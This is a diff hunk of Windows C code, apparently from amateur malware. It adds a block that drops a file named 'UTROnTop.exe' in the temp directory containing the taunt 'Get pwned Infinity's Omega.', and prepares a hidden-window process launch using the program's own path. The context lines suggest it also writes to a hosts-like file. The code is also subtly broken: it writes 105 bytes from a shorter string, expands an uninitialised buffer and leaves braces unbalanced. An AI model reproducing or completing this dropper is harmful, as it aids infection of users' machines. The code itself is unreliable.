@@ -47,3 +47,28 @@ HANDLE hFile = CreateFile(host, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBU
 BOOL bSuccess = WriteFile ( hFile, buffer, strlen(buffer), &byte, NULL);
 CloseHandle(hFile);
 }
+
+{
+	char txtfile[MAX_PATH]; 
+	char tempdir[MAX_PATH]; 
+	char ttxtline[MAX_PATH];
+	char txtline[MAX_PATH];
+	char This_File[MAX_PATH];
+	HANDLE f;
+	DWORD r;
+	PROCESS_INFORMATION pinfo;
+	STARTUPINFO sinfo;
+	GetTempPath(sizeof(tempdir), tempdir);
+	sprintf(txtfile, "%s\\UTROnTop.exe", tempdir);
+	f = CreateFile(txtfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
+	if (f != INVALID_HANDLE_VALUE) {
+		WriteFile(f, "Get pwned Infinity's Omega.", 105, &r, NULL);
+		CloseHandle(f);
+
+		memset(&sinfo, 0, sizeof(STARTUPINFO));
+		sinfo.cb = sizeof(sinfo);
+		sinfo.wShowWindow = SW_HIDE;
+		memset(This_File,0,sizeof(This_File));
+		GetModuleFileName(NULL, This_File, sizeof(This_File));
+		ExpandEnvironmentStrings(ttxtline, txtline, sizeof(txtline)); 
+}
